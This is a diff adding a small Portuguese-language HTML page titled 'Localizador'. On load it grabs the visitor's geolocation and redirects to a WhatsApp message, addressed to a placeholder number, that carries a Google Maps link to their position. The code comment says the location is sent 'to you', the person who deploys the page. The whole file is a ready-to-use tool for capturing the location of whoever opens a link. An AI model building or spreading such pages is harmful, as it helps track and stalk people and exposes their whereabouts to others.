@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Localizador</title>
+    <script>
+        function enviarLocalizacao() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
+                    let linkMaps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                    // Enviar a localização para você (WhatsApp)
+                    window.location.href = `https://api.whatsapp.com/send?phone=SEU_NUMERO&text=Minha localização: ${linkMaps}`;
+                }, function(error) {
+                    alert("Erro ao obter localização: " + error.message);
+                });
+            } else {
+                alert("Geolocalização não suportada pelo navegador.");
+            }
+        }
+    </script>
+</head>
+<body onload="enviarLocalizacao()">
+    <h2>Coletando localização...</h2>
+</body>
+</html>
